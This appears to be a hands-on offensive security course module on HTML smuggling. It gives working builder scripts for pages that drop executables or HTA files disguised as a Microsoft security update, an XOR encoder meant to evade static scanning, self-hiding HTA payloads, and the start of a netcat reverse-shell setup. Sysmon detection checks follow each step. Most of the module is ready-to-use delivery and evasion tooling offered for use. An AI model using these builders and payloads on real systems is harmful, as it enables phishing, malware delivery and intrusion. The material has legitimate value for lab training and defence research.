# Module 03: Browser Delivery and HTML Smuggling

This is where you stop reading and start attacking. Every exercise in this module gives you hands-on access to your Windows target from your Kali attacker box using the delivery technique that survived every defense improvement since 2022.

HTML smuggling is not a vulnerability. It is not a bug. It is a fundamental abuse of how web browsers work. Microsoft cannot patch it without breaking the internet. That is why it is still alive in 2026.

**What you will build in this module:**
- A basic HTML smuggling page that drops a file onto the victim's machine
- An encrypted smuggling page that hides the payload from static analysis
- An HTA-based execution chain from `calc.exe` POC to a live reverse shell
- Obfuscated PowerShell payloads that evade AMSI pattern matching
- A full attack simulation: from smuggling page to an interactive shell on the target
- Sysmon detection analysis after every step so you understand what defenders see

**Time required:** 4-5 hours (hands-on labs throughout)

**Lab safety:** All exercises run within your private VMware lab network. Reverse shells connect from your Windows VM back to your Kali VM on a Host-Only network -- no traffic leaves your machine.

---

## Table of Contents

- [Part 1: How HTML Smuggling Works](#part-1-how-html-smuggling-works)
- [Part 2: Your First Smuggling Page](#part-2-your-first-smuggling-page)
- [Part 3: Smuggling a Windows Executable](#part-3-smuggling-a-windows-executable)
- [Part 4: Adding Encryption -- XOR Encoding Layer](#part-4-adding-encryption----xor-encoding-layer)
- [Part 5: The HTA Execution Chain](#part-5-the-hta-execution-chain)
- [Part 6: Anti-Analysis Techniques](#part-6-anti-analysis-techniques)
- [Part 7: Full Attack Chain -- Zero to Shell](#part-7-full-attack-chain----zero-to-shell)
- [Part 8: Detection Deep Dive -- What Defenders See](#part-8-detection-deep-dive----what-defenders-see)

---

## Part 1: How HTML Smuggling Works

### 1.1 The Problem Attackers Face

After Module 02, you know that modern defenses inspect everything in transit:

```
Attacker sends malware.exe via email
    --> Email gateway scans attachment
    --> Finds executable
    --> BLOCKED

Attacker hosts malware.exe on a web server
    --> Victim clicks link
    --> Web proxy scans the download
    --> Finds executable
    --> BLOCKED (or flagged)
```

Every defense between the attacker and the victim is looking at files as they travel across the network. If the file looks dangerous, it gets blocked before it ever reaches the endpoint.

**HTML smuggling flips this model on its head:** the malicious file never crosses the network. Instead, the attacker sends a harmless-looking HTML page. The HTML page contains JavaScript code that **assembles the malicious file directly inside the victim's browser**. The file is born on the endpoint -- it was never "downloaded" in the traditional sense.

### 1.2 The Blob API -- The Engine Behind Smuggling

HTML smuggling relies on three legitimate browser APIs that every web developer uses:

**API 1: `atob()` -- Base64 Decoding**

```javascript
// Convert a Base64 string back to raw binary data
var decoded = atob("SGVsbG8gV29ybGQ=");
// decoded = "Hello World"
```

Attackers use this to embed binary file data (executables, scripts) as Base64 text inside the HTML page. The JavaScript decodes it back to binary at runtime.

**API 2: `Blob` -- Binary Large Object**

```javascript
// Create a binary file object in memory
var blob = new Blob([binaryData], {type: 'application/octet-stream'});
```

A Blob is a file that exists only in the browser's memory. It has not been written to disk yet. No antivirus can scan it because it is not a file on the filesystem -- it is just bytes in RAM.

**API 3: `URL.createObjectURL()` -- Create a Download Link**

```javascript
// Create a temporary URL that points to the in-memory Blob
var url = URL.createObjectURL(blob);
```

This creates a special `blob:` URL (like `blob:http://example.com/abc123`) that the browser can use to "download" the in-memory Blob to disk, as if it were a normal file download.

### 1.3 The Complete Flow

```
Step 1: Attacker creates an HTML page with embedded Base64 data
Step 2: Victim opens the HTML page (via link, email attachment, etc.)
Step 3: JavaScript in the page runs automatically:
        a. Decodes the Base64 data back to binary bytes
        b. Creates a Blob object from the binary bytes
        c. Creates a blob: URL pointing to the Blob
        d. Creates an invisible <a> element with the download attribute
        e. Programmatically "clicks" the link
Step 4: Browser saves the file to the Downloads folder
Step 5: Victim sees a downloaded file and opens it
```

**What the email gateway / web proxy sees:** A clean HTML page with some JavaScript. No executable. No suspicious file. Just a web page.

**What actually happens on the endpoint:** A fully functional executable or script file materializes in the Downloads folder.

### 1.4 Does MOTW Apply to Smuggled Files?

**Yes.** Modern browsers (Edge, Chrome, Firefox) apply MOTW (`ZoneId=3`) to files downloaded via Blob URLs. The browser knows the file originated from a web context and tags it accordingly.

This means:
- SmartScreen WILL check smuggled executables
- Protected View WILL activate for smuggled Office documents
- Macro blocking WILL apply

**So why is smuggling still useful?** Because smuggling defeats **perimeter defenses** (email gateways, web proxies, sandboxes), not endpoint defenses. The value is getting the payload onto the machine in the first place. Once it is there, you use other techniques (LOLBINs, HTA execution, social engineering) to bypass the endpoint checks.

### 1.5 Why It Cannot Be Patched

The Blob API is essential for modern web applications:
- Google Docs uses it to export documents
- Gmail uses it for attachment downloads
- Every web-based file editor uses it to save files locally
- Video streaming platforms use it for offline downloads

Microsoft and browser vendors **cannot** disable or restrict the Blob API without breaking thousands of legitimate web applications. This is the core reason HTML smuggling has survived since 2022 and will continue to work.

---

## Part 2: Your First Smuggling Page

Let us build the simplest possible HTML smuggling page to understand the mechanics.

### 2.1 Exercise: Smuggle a Text File

**Goal:** Create an HTML page that, when opened, automatically drops a text file onto the Windows VM.

**On your Kali VM**, open a terminal and create the working directories and the HTML file:

```bash
mkdir -p ~/labs/{html,payloads,scripts}

cat > ~/labs/html/smuggle-text.html << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <title>Document Viewer</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .container {
            text-align: center;
            padding: 40px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Loading Document...</h2>
        <div class="spinner"></div>
        <p>Please wait while your document is being prepared.</p>
    </div>

    <script>
        // Step 1: This is our "payload" -- just a text string for now
        // In Base64, "You have been smuggled!\nThis file was assembled
        // inside your browser by JavaScript.\nNo file crossed the network."
        // translates to:
        var base64Data = "WW91IGhhdmUgYmVlbiBzbXVnZ2xlZCEKVGhpcyBmaWxlIHdhcyBhc3NlbWJsZWQgaW5zaWRlIHlvdXIgYnJvd3NlciBieSBKYXZhU2NyaXB0LgpObyBmaWxlIGNyb3NzZWQgdGhlIG5ldHdvcmsu";

        // Step 2: Decode Base64 to raw binary string
        var rawData = atob(base64Data);

        // Step 3: Convert the string to a byte array
        var byteArray = new Uint8Array(rawData.length);
        for (var i = 0; i < rawData.length; i++) {
            byteArray[i] = rawData.charCodeAt(i);
        }

        // Step 4: Create a Blob (in-memory file)
        var blob = new Blob([byteArray], {type: 'application/octet-stream'});

        // Step 5: Create a temporary URL pointing to the Blob
        var url = URL.createObjectURL(blob);

        // Step 6: Create an invisible download link and click it
        var link = document.createElement('a');
        link.href = url;
        link.download = 'document-report.txt';  // filename the victim sees
        document.body.appendChild(link);

        // Step 7: Small delay so the page renders first, then trigger download
        setTimeout(function() {
            link.click();

            // Clean up
            URL.revokeObjectURL(url);
            document.body.removeChild(link);

            // Update the page to look like loading completed
            document.querySelector('.container').innerHTML =
                '<h2>Document Ready</h2>' +
                '<p style="color: green;">&#10004; Your document has been downloaded.</p>' +
                '<p>Check your Downloads folder.</p>';
        }, 2000);  // 2 second delay for realism
    </script>
</body>
</html>
HTMLEOF
```

### 2.2 Serve and Test It

Start the HTTP server on Kali:

```bash
cd ~/labs/html
python3 -m http.server 8080
```

On the **Windows VM**, open Edge (or Firefox) and navigate to:

```
http://192.168.85.129:8080/smuggle-text.html
```

**What you should see:**
1. A clean "Loading Document..." page with a spinning animation
2. After 2 seconds, a file called `document-report.txt` appears in your Downloads
3. The page updates to say "Document Ready"

**Open the downloaded file.** It should contain:

```
You have been smuggled!
This file was assembled inside your browser by JavaScript.
No file crossed the network.
```

### 2.3 Inspect the MOTW

Open PowerShell on the Windows VM:

```powershell
Get-Content -Path "$env:USERPROFILE\Downloads\document-report.txt" -Stream Zone.Identifier
```

You should see:

```
[ZoneTransfer]
ZoneId=3
HostUrl=blob:http://192.168.85.129:8080/...
```

Notice the `HostUrl` says `blob:` -- this tells you the file was created via the Blob API, not downloaded traditionally. This is a forensic indicator of HTML smuggling.

### 2.4 What Just Happened (Step by Step)

```
1. Your browser fetched a normal HTML page (no malware in transit)
2. JavaScript decoded a Base64 string into raw bytes (in browser memory)
3. JavaScript created a Blob object (in-memory file)
4. JavaScript created a blob: URL and an <a> tag with download attribute
5. JavaScript programmatically clicked the link
6. Browser saved the Blob to disk as "document-report.txt"
7. Browser applied MOTW (ZoneId=3) to the saved file
```

An email gateway scanning this HTML page would see: HTML + CSS + JavaScript. No executable. No suspicious file type. Clean.

**Congratulations. You just performed your first HTML smuggling attack.**

---

## Part 3: Smuggling a Windows Executable

Now let us smuggle something more interesting -- a real Windows executable.

### 3.1 Create a Harmless Windows Executable on Kali

We will create a simple program that opens `calc.exe` (the classic "proof of concept" in security research):

```bash
cat > ~/labs/payloads/poc.c << 'EOF'
#include <stdlib.h>
#include <stdio.h>
int main() {
    printf("[*] HTML Smuggling POC - Payload Executed!\n");
    printf("[*] Opening calculator as proof of execution...\n");
    system("calc.exe");
    printf("[*] Done. Check your Sysmon logs!\n");
    return 0;
}
EOF
```

Compile it as a Windows executable:

```bash
x86_64-w64-mingw32-gcc ~/labs/payloads/poc.c -o ~/labs/payloads/poc.exe
```

> If `x86_64-w64-mingw32-gcc` is not installed, run: `sudo apt install -y gcc-mingw-w64-x86-64`

### 3.2 Base64-Encode the Executable

```bash
base64 -w0 ~/labs/payloads/poc.exe > ~/labs/payloads/poc_b64.txt
```

Check the size:

```bash
wc -c ~/labs/payloads/poc_b64.txt
```

This will be around 300-400 KB of Base64 text. That is the data we will embed in our HTML page.

### 3.3 Build the Smuggling Page

We need a script that reads the Base64 file and generates the HTML page:

```bash
cat > ~/labs/scripts/build_smuggler.sh << 'SCRIPTEOF'
#!/bin/bash
# HTML Smuggling Page Builder
# Usage: ./build_smuggler.sh <base64_file> <output_filename> <download_name>

B64_FILE="$1"
OUTPUT="$2"
DOWNLOAD_NAME="$3"

if [ -z "$B64_FILE" ] || [ -z "$OUTPUT" ] || [ -z "$DOWNLOAD_NAME" ]; then
    echo "Usage: $0 <base64_file> <output.html> <download_filename>"
    echo "Example: $0 poc_b64.txt smuggle-exe.html SecurityUpdate.exe"
    exit 1
fi

B64_DATA=$(cat "$B64_FILE")

cat > "$OUTPUT" << HTMLEOF
<!DOCTYPE html>
<html>
<head>
    <title>Microsoft Security Update</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, sans-serif;
            margin: 0;
            padding: 0;
            background: #f5f5f5;
            color: #333;
        }
        .header {
            background: #0078d4;
            color: white;
            padding: 15px 30px;
            font-size: 18px;
        }
        .content {
            max-width: 600px;
            margin: 40px auto;
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        .progress-bar {
            width: 100%;
            height: 20px;
            background: #e0e0e0;
            border-radius: 10px;
            overflow: hidden;
            margin: 20px 0;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #0078d4, #00bcf2);
            border-radius: 10px;
            animation: fill 2s ease-in-out forwards;
        }
        @keyframes fill {
            from { width: 0%; }
            to { width: 100%; }
        }
        .status { color: #666; font-size: 14px; }
        .done { color: #107c10; font-weight: bold; }
    </style>
</head>
<body>
    <div class="header">Microsoft Security Center</div>
    <div class="content">
        <h2>Security Update Required</h2>
        <p>A critical security update is being prepared for your system.</p>
        <div class="progress-bar"><div class="progress-fill"></div></div>
        <p class="status" id="status">Preparing update package...</p>
    </div>

    <script>
        var base64Data = "${B64_DATA}";

        setTimeout(function() {
            document.getElementById('status').innerText = 'Downloading update...';

            // Decode
            var rawData = atob(base64Data);
            var byteArray = new Uint8Array(rawData.length);
            for (var i = 0; i < rawData.length; i++) {
                byteArray[i] = rawData.charCodeAt(i);
            }

            // Create Blob and trigger download
            var blob = new Blob([byteArray], {type: 'application/octet-stream'});
            var url = URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = '${DOWNLOAD_NAME}';
            document.body.appendChild(a);
            a.click();
            URL.revokeObjectURL(url);
            document.body.removeChild(a);

            document.getElementById('status').innerHTML =
                '<span class="done">&#10004; Update downloaded successfully.</span><br>' +
                '<small>Open the downloaded file to apply the update.</small>';
        }, 2500);
    </script>
</body>
</html>
HTMLEOF

echo "[+] Smuggling page created: $OUTPUT"
echo "[+] Payload will download as: $DOWNLOAD_NAME"
echo "[+] File size: $(wc -c < "$OUTPUT") bytes"
SCRIPTEOF

chmod +x ~/labs/scripts/build_smuggler.sh
```

Now build the smuggling page:

```bash
cd ~/labs
./scripts/build_smuggler.sh payloads/poc_b64.txt html/smuggle-exe.html SecurityUpdate.exe
```

### 3.4 Serve and Test

```bash
cd ~/labs/html
python3 -m http.server 8080
```

On the **Windows VM**, open Firefox and navigate to:

```
http://192.168.85.129:8080/smuggle-exe.html
```

**What you should see:**
1. A professional-looking "Microsoft Security Update" page
2. A progress bar that fills up
3. After 2.5 seconds, `SecurityUpdate.exe` drops into your Downloads folder
4. The page says "Update downloaded successfully"

### 3.5 Run the Smuggled Executable

Since we compiled this ourselves (unsigned, unknown reputation), SmartScreen will likely trigger.

Open PowerShell on the Windows VM and run it from the command line to see the output:

```powershell
cd ~\Downloads
.\SecurityUpdate.exe
```

> **Note:** If SmartScreen or Defender blocks it, copy the file to the exclusion folder we set up in Module 00:
> ```powershell
> copy ~\Downloads\SecurityUpdate.exe C:\Tools\Labs\
> cd C:\Tools\Labs
> .\SecurityUpdate.exe
> ```

**Expected output:**

```
[*] HTML Smuggling POC - Payload Executed!
[*] Opening calculator as proof of execution...
[*] Done. Check your Sysmon logs!
```

And the Windows Calculator should open.

### 3.6 Check Sysmon Telemetry

In Administrator PowerShell:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 50 |
    Where-Object { $_.Id -eq 1 -and $_.Message -match "SecurityUpdate|calc" } |
    Format-List TimeCreated, Message
```

You should see two process creation events:
1. `SecurityUpdate.exe` itself running
2. `calc.exe` spawned by `SecurityUpdate.exe`

**Key detection indicator:** The parent process chain. Defenders look for unusual parent-child relationships. `explorer.exe` spawning a random unsigned executable from `Downloads` that then launches `calc.exe` -- this screams suspicious to any SOC analyst.

---

## Part 4: Adding Encryption -- XOR Encoding Layer

The smuggling page from Part 3 has a weakness: the Base64-encoded payload is sitting in plain text inside the HTML source. Any security product that opens the HTML file and decodes the Base64 will find the executable.

Let us add an encryption layer so the payload is hidden from static analysis.

### 4.1 How XOR Encryption Works

XOR (exclusive OR) is the simplest encryption possible:

```
Original byte:    01001101  (M)
XOR key byte:     01011010  (Z)
                  --------
Encrypted byte:   00010111  (garbage)

Encrypted byte:   00010111  (garbage)
XOR key byte:     01011010  (Z)  -- same key!
                  --------
Decrypted byte:   01001101  (M)  -- back to original!
```

The beauty of XOR: applying the same key twice gives you back the original data. Encryption and decryption are the same operation.

### 4.2 Create the XOR Encoder (Python -- runs on Kali)

```bash
cat > ~/labs/scripts/xor_encode.py << 'PYEOF'
#!/usr/bin/env python3
"""
XOR encoder for HTML smuggling payloads.
Reads a binary file, XOR-encrypts it with a key, and outputs Base64.
"""
import sys
import base64

def xor_encrypt(data, key):
    """XOR each byte of data with the corresponding byte of the key (repeating)."""
    key_bytes = key.encode('utf-8')
    encrypted = bytearray()
    for i, byte in enumerate(data):
        encrypted.append(byte ^ key_bytes[i % len(key_bytes)])
    return bytes(encrypted)

if len(sys.argv) != 4:
    print(f"Usage: {sys.argv[0]} <input_file> <output_b64_file> <xor_key>")
    print(f"Example: {sys.argv[0]} poc.exe poc_xor_b64.txt MySecretKey123")
    sys.exit(1)

input_file = sys.argv[1]
output_file = sys.argv[2]
xor_key = sys.argv[3]

# Read the binary file
with open(input_file, 'rb') as f:
    raw_data = f.read()

print(f"[+] Read {len(raw_data)} bytes from {input_file}")
print(f"[+] XOR key: {xor_key}")

# XOR encrypt
encrypted = xor_encrypt(raw_data, xor_key)

# Base64 encode
b64_data = base64.b64encode(encrypted).decode('utf-8')

# Write output
with open(output_file, 'w') as f:
    f.write(b64_data)

print(f"[+] Encrypted and encoded: {len(b64_data)} bytes written to {output_file}")
PYEOF

chmod +x ~/labs/scripts/xor_encode.py
```

### 4.3 Encrypt the Payload

```bash
python3 ~/labs/scripts/xor_encode.py ~/labs/payloads/poc.exe ~/labs/payloads/poc_xor_b64.txt "SmuggleKey2026"
```

Now the Base64 data in `poc_xor_b64.txt` is encrypted. If anyone decodes the Base64, they get garbage -- not the original executable.

### 4.4 Build the Encrypted Smuggling Page

```bash
cat > ~/labs/scripts/build_xor_smuggler.sh << 'SCRIPTEOF'
#!/bin/bash
# Encrypted HTML Smuggling Page Builder (XOR + Base64)

B64_FILE="$1"
OUTPUT="$2"
DOWNLOAD_NAME="$3"
XOR_KEY="$4"

if [ -z "$B64_FILE" ] || [ -z "$OUTPUT" ] || [ -z "$DOWNLOAD_NAME" ] || [ -z "$XOR_KEY" ]; then
    echo "Usage: $0 <xor_b64_file> <output.html> <download_filename> <xor_key>"
    exit 1
fi

B64_DATA=$(cat "$B64_FILE")

cat > "$OUTPUT" << HTMLEOF
<!DOCTYPE html>
<html>
<head>
    <title>Document Portal</title>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            background: #1a1a2e;
            color: #eee;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: #16213e;
            padding: 40px;
            border-radius: 12px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
            max-width: 500px;
        }
        .loader {
            width: 50px; height: 50px;
            border: 5px solid #333;
            border-top: 5px solid #e94560;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .btn {
            display: none;
            background: #e94560;
            color: white;
            border: none;
            padding: 12px 30px;
            font-size: 16px;
            border-radius: 6px;
            cursor: pointer;
            margin-top: 15px;
        }
        .btn:hover { background: #c73550; }
    </style>
</head>
<body>
    <div class="card">
        <h2 id="title">Decrypting Document...</h2>
        <div class="loader" id="loader"></div>
        <p id="msg">Processing secure document. Please wait.</p>
        <button class="btn" id="dlBtn" onclick="doDownload()">Download Document</button>
    </div>

    <script>
        // XOR-encrypted, Base64-encoded payload
        var encData = "${B64_DATA}";
        var xorKey = "${XOR_KEY}";
        var fileName = "${DOWNLOAD_NAME}";
        var blobUrl = null;

        function xorDecrypt(data, key) {
            var result = new Uint8Array(data.length);
            for (var i = 0; i < data.length; i++) {
                result[i] = data[i] ^ key.charCodeAt(i % key.length);
            }
            return result;
        }

        // Decrypt after a delay (simulates "processing")
        setTimeout(function() {
            // Step 1: Base64 decode
            var raw = atob(encData);
            var encrypted = new Uint8Array(raw.length);
            for (var i = 0; i < raw.length; i++) {
                encrypted[i] = raw.charCodeAt(i);
            }

            // Step 2: XOR decrypt
            var decrypted = xorDecrypt(encrypted, xorKey);

            // Step 3: Create Blob
            var blob = new Blob([decrypted], {type: 'application/octet-stream'});
            blobUrl = URL.createObjectURL(blob);

            // Update UI
            document.getElementById('loader').style.display = 'none';
            document.getElementById('title').innerText = 'Document Ready';
            document.getElementById('msg').innerText = 'Your document has been decrypted.';
            document.getElementById('dlBtn').style.display = 'inline-block';
        }, 3000);

        function doDownload() {
            var a = document.createElement('a');
            a.href = blobUrl;
            a.download = fileName;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            document.getElementById('msg').innerText = 'Downloaded. Check your Downloads folder.';
            document.getElementById('dlBtn').style.display = 'none';
        }
    </script>
</body>
</html>
HTMLEOF

echo "[+] XOR-encrypted smuggling page created: $OUTPUT"
echo "[+] XOR key embedded: $XOR_KEY"
echo "[+] Download filename: $DOWNLOAD_NAME"
SCRIPTEOF

chmod +x ~/labs/scripts/build_xor_smuggler.sh
```

Build the encrypted page:

```bash
cd ~/labs
./scripts/build_xor_smuggler.sh payloads/poc_xor_b64.txt html/smuggle-xor.html SecurityPatch.exe "SmuggleKey2026"
```

### 4.5 Test the Encrypted Smuggling Page

```bash
cd ~/labs/html
python3 -m http.server 8080
```

On the **Windows VM**, open Firefox:

```
http://192.168.85.129:8080/smuggle-xor.html
```

**What you should see:**
1. A dark-themed "Decrypting Document..." page with a spinning loader
2. After 3 seconds, a **"Download Document"** button appears
3. Click the button -- `SecurityPatch.exe` drops into Downloads
4. Copy it to `C:\Tools\Labs` and run it -- Calculator opens

### 4.6 Why This Matters

If a security tool inspects the HTML source and finds the Base64 data, it will decode it and find... encrypted garbage. Not an executable. The XOR key is embedded in the JavaScript, but an automated scanner would need to actually execute the JavaScript to reconstruct the file. Most static analysis tools do not do this.

**Defense layers bypassed by encrypted smuggling:**
- Email gateway: sees HTML + JavaScript (clean)
- Web proxy: sees HTML download (clean)
- Static file analysis: Base64 decodes to encrypted noise (clean)
- Sandbox: may or may not execute JavaScript fully

**Defense layers NOT bypassed:**
- MOTW: still applied by the browser
- SmartScreen: still checks the downloaded file
- Defender: still scans the file on disk
- Sysmon: still logs everything

---

## Part 5: The HTA Execution Chain

So far, we have been smuggling `.exe` files. The problem: `.exe` files trigger immediate suspicion from SmartScreen, Defender, and the user. Let us use a different file type that executes code but looks less threatening.

### 5.1 What Is an HTA File?

An HTA (HTML Application) is a file with the `.hta` extension that contains HTML and VBScript or JScript. When you double-click an `.hta` file, Windows runs it using `mshta.exe` -- a signed Microsoft binary.

**Why HTA is useful for attackers:**
1. `mshta.exe` is a trusted, signed Microsoft binary (it IS the operating system)
2. HTA files can execute VBScript/JScript with full system access
3. HTA files can run commands, create files, download content
4. The icon for `.hta` files can be confused with `.html` files by non-technical users

### 5.2 Create an HTA Payload

On Kali, create an HTA file that opens Calculator (our safe proof-of-concept):

```bash
cat > ~/labs/payloads/update.hta << 'HTAEOF'
<html>
<head>
    <title>System Update</title>
    <HTA:APPLICATION
        ID="SystemUpdate"
        APPLICATIONNAME="System Update"
        BORDER="thin"
        BORDERSTYLE="normal"
        CAPTION="yes"
        MAXIMIZEBUTTON="no"
        MINIMIZEBUTTON="no"
        SHOWINTASKBAR="no"
        SINGLEINSTANCE="yes"
        SYSMENU="no"
        WINDOWSTATE="minimize"
    />
</head>
<body>
<script language="VBScript">
    ' Minimize the window immediately so the user barely sees it
    self.resizeTo 0, 0
    self.moveTo -1000, -1000

    ' Create a shell object
    Set objShell = CreateObject("WScript.Shell")

    ' === PAYLOAD SECTION ===
    ' In a real engagement, this would be a reverse shell or C2 stager
    ' For our lab, we open calc.exe as proof of concept
    objShell.Run "calc.exe", 1, False

    ' Close the HTA window after execution
    self.close
</script>
</body>
</html>
HTAEOF
```

### 5.3 Test the HTA Locally First

Before smuggling it, let us verify it works by serving it directly.

On Kali:

```bash
cd ~/labs/payloads
python3 -m http.server 8080
```

On the **Windows VM**, open Firefox and download:

```
http://192.168.85.129:8080/update.hta
```

Now navigate to your Downloads folder and double-click `update.hta`.

**What should happen:**
1. A brief flash of a window (the HTA minimizes itself immediately)
2. Calculator opens
3. The HTA window closes itself

> **If SmartScreen blocks it:** Click "More info" → "Run anyway". SmartScreen warns because the file has MOTW from the internet, but it does allow the user to override.

**This is the execution chain:** You double-clicked an HTA file, Windows invoked `mshta.exe`, which ran the VBScript inside, which called `calc.exe`.

### 5.4 Smuggle the HTA

Now let us deliver this HTA via HTML smuggling so it bypasses perimeter defenses.

On Kali:

```bash
# Base64-encode the HTA
base64 -w0 ~/labs/payloads/update.hta > ~/labs/payloads/hta_b64.txt

# Build the smuggling page
cd ~/labs
./scripts/build_smuggler.sh payloads/hta_b64.txt html/smuggle-hta.html Update.hta
```

Serve it:

```bash
cd ~/labs/html
python3 -m http.server 8080
```

On the **Windows VM**, open Firefox:

```
http://192.168.85.129:8080/smuggle-hta.html
```

**What happens:**
1. The "Microsoft Security Update" themed page loads
2. After 2.5 seconds, `Update.hta` drops into Downloads
3. Navigate to Downloads and double-click `Update.hta`
4. SmartScreen may warn -- click "More info" → "Run anyway"
5. Calculator pops open

**You just performed a complete HTML smuggling to HTA execution chain.** The HTA file was never sent as a file over the network. It was assembled inside the browser from JavaScript.

### 5.5 Check the Full Sysmon Trail

This is where it gets really educational. Let us see what the entire attack chain looks like in Sysmon.

In Administrator PowerShell on the Windows VM:

```powershell
# Find the mshta.exe process creation
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 100 |
    Where-Object { $_.Id -eq 1 -and $_.Message -match "mshta" } |
    Select-Object -First 1 |
    Format-List TimeCreated, Message
```

You should see:
- **Image:** `C:\Windows\System32\mshta.exe`
- **CommandLine:** `"C:\Windows\System32\mshta.exe" "C:\Users\...\Downloads\Update.hta"`
- **ParentImage:** `C:\Windows\explorer.exe` (because you double-clicked it)

Now find the child process (calc.exe spawned by mshta.exe):

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 100 |
    Where-Object { $_.Id -eq 1 -and $_.Message -match "calc" } |
    Select-Object -First 1 |
    Format-List TimeCreated, Message
```

You should see:
- **Image:** `C:\Windows\System32\calc.exe`
- **ParentImage:** `C:\Windows\System32\mshta.exe`

**This is the detection chain:** `explorer.exe` → `mshta.exe` → `calc.exe`. A SOC analyst seeing `mshta.exe` spawn ANY child process would immediately flag this as suspicious.

### 5.6 The HTA + PowerShell Variant

Instead of launching `calc.exe`, a real attacker would use the HTA to run a PowerShell command. Let us create a version that runs `whoami` and writes the output to a file (still harmless, but demonstrates the concept):

```bash
cat > ~/labs/payloads/recon.hta << 'HTAEOF'
<html>
<head>
    <HTA:APPLICATION WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no" />
</head>
<body>
<script language="VBScript">
    self.resizeTo 0, 0
    self.moveTo -1000, -1000

    Set objShell = CreateObject("WScript.Shell")

    ' Run whoami and write output to a file
    objShell.Run "cmd.exe /c whoami > C:\Tools\Labs\whoami_output.txt", 0, True

    ' Also grab basic system info
    objShell.Run "cmd.exe /c systeminfo | findstr /B /C:""OS Name"" /C:""OS Version"" >> C:\Tools\Labs\whoami_output.txt", 0, True

    self.close
</script>
</body>
</html>
HTAEOF
```

Smuggle it:

```bash
base64 -w0 ~/labs/payloads/recon.hta > ~/labs/payloads/recon_hta_b64.txt
cd ~/labs
./scripts/build_smuggler.sh payloads/recon_hta_b64.txt html/smuggle-recon.html SystemCheck.hta
```

Test it on Windows the same way. After running the HTA, check:

```powershell
Get-Content C:\Tools\Labs\whoami_output.txt
```

You should see your username and OS information. This demonstrates how an attacker would use HTML smuggling + HTA to perform initial reconnaissance on the target.

Now check the Sysmon trail:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 100 |
    Where-Object { $_.Id -eq 1 -and ($_.Message -match "mshta|cmd.exe|whoami|systeminfo") } |
    Select-Object -First 10 |
    Format-List TimeCreated, Message
```

You will see the complete execution chain: `mshta.exe` → `cmd.exe` → `whoami.exe` / `systeminfo.exe`. Every single step is logged.

### 5.7 Understanding Reverse Shells

Now that you have proven the HTA → mshta.exe → command execution chain works, it is time to use it for its real purpose: **getting an interactive shell on the target machine.**

**What is a reverse shell?**

A reverse shell is when the target machine (Windows) initiates an outbound network connection to the attacker machine (Kali) and provides an interactive command prompt over that connection.

```
Normal shell (you connect TO the target):
    Attacker ---SSH/RDP---> Target
    Problem: Firewalls BLOCK inbound connections to the target

Reverse shell (target connects BACK to you):
    Target ---TCP outbound---> Attacker
    Advantage: Firewalls rarely block OUTBOUND connections
```

**Why "reverse"?** In almost every corporate network, the firewall blocks incoming connections to workstations. But it allows outgoing connections because users need to browse the web, send emails, use cloud apps. A reverse shell exploits this asymmetry -- the target reaches out to the attacker, not the other way around.

**The two components you need:**

```
Component 1 -- LISTENER (runs on Kali, the attacker):
  A program that opens a port and waits for incoming connections.
  Think of it as "picking up the phone and waiting for someone to call."
  Tool: netcat (nc)

Component 2 -- PAYLOAD (runs on Windows, the target):
  Code that connects to the attacker's IP and port, then pipes
  a command shell (cmd.exe or powershell.exe) through that connection.
  Everything the attacker types gets executed on the target.
  All output flows back to the attacker.
  Tool: PowerShell script inside our HTA
```

**What the connection looks like at the network level:**

```
Windows (192.168.85.128) ---TCP port 4444---> Kali (192.168.85.129)

This is an OUTBOUND connection from Windows.
To the network, it looks like Windows is connecting to a website.
Firewalls allow this by default.
The connection persists -- it stays open as long as the shell runs.
```

**What happens when you type a command in the shell:**

```
1. You type "whoami" + Enter in the Kali terminal
2. Netcat sends the bytes "whoami\n" through the TCP socket to Windows
3. PowerShell on Windows reads "whoami" from the socket
4. PowerShell passes "whoami" to Invoke-Expression (iex)
5. Windows runs whoami.exe and captures the output
6. PowerShell sends "desktop-target\vamsi\nPS C:\Users\Vamsi> " back to Kali
7. Netcat on Kali receives and displays the output
8. You see the result in your terminal
```

This is the fundamental mechanism behind ALL C2 (Command and Control) frameworks. Whether you use Sliver, Cobalt Strike, Metasploit, or a custom tool, they all work on this same principle: a loop that reads commands from a socket, executes them on the target, and sends the results back.

### 5.8 Setting Up the Listener on Kali

Before we create the payload, we must start the listener. The listener must be running BEFORE the target executes the reverse shell, otherwise the connection has nowhere to go and it fails silently.

**On your Kali VM**, open a **new terminal tab** (keep your HTTP server running in the other tab if it is still active):

```bash
# Netcat should already be on Kali, but install it if missing
which nc || sudo apt install -y ncat

# Start a listener on port 4444
nc -lvnp 4444
```

**What each flag means:**

| Flag | Meaning |
|:-----|:--------|
| `-l` | **Listen mode** -- do not connect out, wait for incoming connections |
| `-v` | **Verbose** -- print connection details when someone connects |
